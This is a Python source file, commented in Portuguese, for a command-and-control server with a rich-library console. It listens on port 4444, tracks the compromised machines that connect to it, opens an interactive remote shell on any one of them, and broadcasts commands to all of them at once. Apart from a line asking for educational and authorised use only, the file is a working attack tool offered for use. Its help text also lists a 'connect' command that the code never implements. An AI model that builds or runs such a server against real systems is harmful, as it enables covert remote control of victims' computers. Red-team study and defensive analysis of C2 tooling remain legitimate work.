#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import socket
import threading
import json
import os
import sys
import time
import random
import base64
import select
from datetime import datetime

# Verifica se as dependências estão instaladas
try:
    from rich.console import Console
    from rich.panel import Panel
    from rich.text import Text
    from rich.prompt import Prompt
    from rich.table import Table
    from rich.progress import Progress
    RICH_AVAILABLE = True
except ImportError:
    RICH_AVAILABLE = False
    print("Instale a biblioteca rich: pip install rich")
    sys.exit(1)

# Configuração do console
console = Console()

class C2Server:
    def __init__(self):
        self.host = "0.0.0.0"
        self.port = 4444
        self.clients = {}
        self.sessions = {}
        self.next_session_id = 1
        self.running = False
        self.server_socket = None
        
    def display_banner(self):
        banner = """
██████╗ ██████╗ 
██╔══██╗╚════██╗
██████╔╝ █████╔╝
██╔══██╗██╔═══╝ 
██████╔╝███████╗
╚═════╝ ╚══════╝
COMMAND & CONTROL SERVER v2.0
"""
        console.print(Panel.fit(
            f"[bold red]{banner}[/bold red]",
            title="[bold white on red] C2 SERVER [/bold white on red]",
            border_style="red",
            padding=(1, 2)
        ))
        
        console.print(Panel.fit(
            "[yellow]⚠️  USE APENAS PARA FINS EDUCACIONAIS E TESTES AUTORIZADOS! ⚠️[/yellow]",
            border_style="yellow"
        ))
        
    def start_server(self):
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind((self.host, self.port))
            self.server_socket.listen(5)
            
            self.running = True
            console.print(f"[green]✓ Servidor C2 iniciado em {self.host}:{self.port}[/green]")
            
            # Thread para aceitar conexões
            accept_thread = threading.Thread(target=self.accept_connections)
            accept_thread.daemon = True
            accept_thread.start()
            
            return True
        except Exception as e:
            console.print(f"[red]✗ Erro ao iniciar servidor: {e}[/red]")
            return False
    
    def accept_connections(self):
        while self.running:
            try:
                client_socket, client_address = self.server_socket.accept()
                
                # Gerar ID de sessão
                session_id = self.next_session_id
                self.next_session_id += 1
                
                # Adicionar à lista de clientes
                self.clients[session_id] = {
                    'socket': client_socket,
                    'address': client_address,
                    'connected_at': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                    'last_seen': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                    'info': 'Desconhecido'
                }
                
                self.sessions[session_id] = client_socket
                
                console.print(f"[green]✓ Nova conexão de {client_address[0]}:{client_address[1]} (Sessão: {session_id})[/green]")
                
                # Thread para lidar com o cliente
                client_thread = threading.Thread(
                    target=self.handle_client, 
                    args=(client_socket, client_address, session_id)
                )
                client_thread.daemon = True
                client_thread.start()
                
            except Exception as e:
                if self.running:
                    console.print(f"[red]✗ Erro ao aceitar conexão: {e}[/red]")
    
    def handle_client(self, client_socket, client_address, session_id):
        try:
            while self.running:
                # Receber dados do cliente
                data = client_socket.recv(4096).decode('utf-8')
                if not data:
                    break
                    
                # Atualizar último visto
                if session_id in self.clients:
                    self.clients[session_id]['last_seen'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                    
                # Processar comando (se for um comando especial)
                if data.startswith("INFO:"):
                    info = data[5:]
                    if session_id in self.clients:
                        self.clients[session_id]['info'] = info
                    console.print(f"[cyan]ℹ️  Info da sessão {session_id}: {info}[/cyan]")
                    
        except Exception as e:
            console.print(f"[red]✗ Erro na sessão {session_id}: {e}[/red]")
        finally:
            self.remove_client(session_id)
    
    def remove_client(self, session_id):
        if session_id in self.clients:
            client_info = self.clients[session_id]
            console.print(f"[yellow]✗ Conexão fechada: Sessão {session_id} ({client_info['address'][0]})[/yellow]")
            
            try:
                client_info['socket'].close()
            except:
                pass
            
            del self.clients[session_id]
            if session_id in self.sessions:
                del self.sessions[session_id]
    
    def send_command(self, session_id, command):
        if session_id not in self.sessions:
            console.print(f"[red]✗ Sessão {session_id} não encontrada[/red]")
            return False
            
        try:
            self.sessions[session_id].send(command.encode('utf-8'))
            return True
        except Exception as e:
            console.print(f"[red]✗ Erro ao enviar comando: {e}[/red]")
            self.remove_client(session_id)
            return False
    
    def list_clients(self):
        if not self.clients:
            console.print("[yellow]Nenhum cliente conectado[/yellow]")
            return
            
        table = Table(title="Clientes Conectados", show_header=True, header_style="bold magenta")
        table.add_column("Sessão", style="cyan")
        table.add_column("Endereço", style="green")
        table.add_column("Conectado em")
        table.add_column("Último visto")
        table.add_column("Info")
        
        for session_id, client in self.clients.items():
            table.add_row(
                str(session_id),
                f"{client['address'][0]}:{client['address'][1]}",
                client['connected_at'],
                client['last_seen'],
                client['info']
            )
            
        console.print(table)
    
    def interactive_shell(self, session_id):
        if session_id not in self.sessions:
            console.print(f"[red]✗ Sessão {session_id} não encontrada[/red]")
            return
            
        console.print(f"[green]Iniciando shell interativo com sessão {session_id}[/green]")
        console.print("[yellow]Digite 'exit' para sair do shell[/yellow]")
        
        while True:
            try:
                command = Prompt.ask(f"[bold red]c2 shell {session_id}[/bold red] > ")
                
                if command.lower() in ['exit', 'quit']:
                    break
                    
                if not command.strip():
                    continue
                    
                # Enviar comando
                if not self.send_command(session_id, command + "\n"):
                    break
                    
                # Aguardar resposta (simples implementação)
                time.sleep(0.5)
                
            except KeyboardInterrupt:
                console.print("\n[yellow]Shell interrompido[/yellow]")
                break
            except Exception as e:
                console.print(f"[red]Erro no shell: {e}[/red]")
                break
    
    def show_help(self):
        help_text = """
Comandos disponíveis:
- connect [ip] [porta]  - Conectar a um servidor C2 remoto
- listen [porta]        - Iniciar servidor na porta especificada
- sessions              - Listar sessões ativas
- shell [id]            - Iniciar shell interativo com a sessão
- info [id]             - Mostrar informações da sessão
- kill [id]             - Encerrar sessão
- broadcast [comando]   - Enviar comando para todas as sessões
- clear                 - Limpar a tela
- help                  - Mostrar esta ajuda
- exit                  - Sair do C2
"""
        console.print(Panel.fit(help_text, title="[bold]Ajuda[/bold]", border_style="blue"))
    
    def run(self):
        self.display_banner()
        
        if not self.start_server():
            return
            
        console.print("[green]Digite 'help' para ver os comandos disponíveis[/green]")
        
        # Loop principal de comando
        while True:
            try:
                command = Prompt.ask("[bold red]c2[/bold red] > ").strip().split()
                
                if not command:
                    continue
                    
                cmd = command[0].lower()
                args = command[1:]
                
                if cmd == "help":
                    self.show_help()
                    
                elif cmd == "clear":
                    console.clear()
                    self.display_banner()
                    
                elif cmd == "sessions" or cmd == "list":
                    self.list_clients()
                    
                elif cmd == "shell":
                    if not args:
                        console.print("[red]Uso: shell [id_sessão][/red]")
                    else:
                        try:
                            session_id = int(args[0])
                            self.interactive_shell(session_id)
                        except ValueError:
                            console.print("[red]ID de sessão deve ser um número[/red]")
                            
                elif cmd == "info":
                    if not args:
                        console.print("[red]Uso: info [id_sessão][/red]")
                    else:
                        try:
                            session_id = int(args[0])
                            if session_id in self.clients:
                                client = self.clients[session_id]
                                info_table = Table(title=f"Informações da Sessão {session_id}", show_header=False)
                                info_table.add_row("Endereço", f"{client['address'][0]}:{client['address'][1]}")
                                info_table.add_row("Conectado em", client['connected_at'])
                                info_table.add_row("Último visto", client['last_seen'])
                                info_table.add_row("Info", client['info'])
                                console.print(info_table)
                            else:
                                console.print(f"[red]Sessão {session_id} não encontrada[/red]")
                        except ValueError:
                            console.print("[red]ID de sessão deve ser um número[/red]")
                            
                elif cmd == "kill":
                    if not args:
                        console.print("[red]Uso: kill [id_sessão][/red]")
                    else:
                        try:
                            session_id = int(args[0])
                            if session_id in self.clients:
                                self.remove_client(session_id)
                                console.print(f"[green]Sessão {session_id} encerrada[/green]")
                            else:
                                console.print(f"[red]Sessão {session_id} não encontrada[/red]")
                        except ValueError:
                            console.print("[red]ID de sessão deve ser um número[/red]")
                            
                elif cmd == "broadcast":
                    if not args:
                        console.print("[red]Uso: broadcast [comando][/red]")
                    else:
                        command_str = " ".join(args)
                        for session_id in list(self.sessions.keys()):
                            self.send_command(session_id, command_str + "\n")
                        console.print(f"[green]Comando enviado para {len(self.sessions)} sessões[/green]")
                        
                elif cmd == "listen":
                    if args:
                        try:
                            port = int(args[0])
                            self.port = port
                            console.print(f"[yellow]Reiniciando servidor na porta {port}...[/yellow]")
                            self.running = False
                            if self.server_socket:
                                self.server_socket.close()
                            time.sleep(1)
                            self.__init__()
                            self.port = port
                            self.start_server()
                        except ValueError:
                            console.print("[red]Porta deve ser um número[/red]")
                    else:
                        console.print(f"[green]Servidor ouvindo na porta {self.port}[/green]")
                        
                elif cmd == "exit" or cmd == "quit":
                    console.print("[yellow]Encerrando servidor C2...[/yellow]")
                    self.running = False
                    if self.server_socket:
                        self.server_socket.close()
                    for session_id in list(self.sessions.keys()):
                        self.remove_client(session_id)
                    break
                    
                else:
                    console.print(f"[red]Comando não reconhecido: {cmd}[/red]")
                    
            except KeyboardInterrupt:
                console.print("\n[yellow]Use 'exit' para sair[/yellow]")
            except Exception as e:
                console.print(f"[red]Erro ao processar comando: {e}[/red]")

def main():
    # Verificar se é root para portas baixas
    if os.geteuid() != 0 and len(sys.argv) > 1:
        try:
            port = int(sys.argv[1])
            if port < 1024:
                console.print("[yellow]⚠️  Para usar portas abaixo de 1024, execute como root[/yellow]")
        except:
            pass
            
    server = C2Server()
    server.run()

if __name__ == "__main__":
    main()
